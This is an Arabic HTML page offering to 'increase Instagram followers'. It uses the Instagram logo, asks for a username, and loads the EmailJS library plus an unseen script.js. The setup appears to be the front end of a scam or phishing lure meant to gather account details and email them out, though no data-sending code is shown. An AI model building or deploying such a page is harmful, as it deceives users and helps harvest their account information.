<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>زيادة متابعين إنستغرام</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="followers-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <h2>زيادة متابعين إنستغرام</h2>
        <form id="followerForm">
            <input type="text" id="username" name="username" placeholder="اسم المستخدم على إنستغرام" required>
            <button type="button" onclick="sendFollowerRequest()">زيادة المتابعين</button>
        </form>
    </div>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
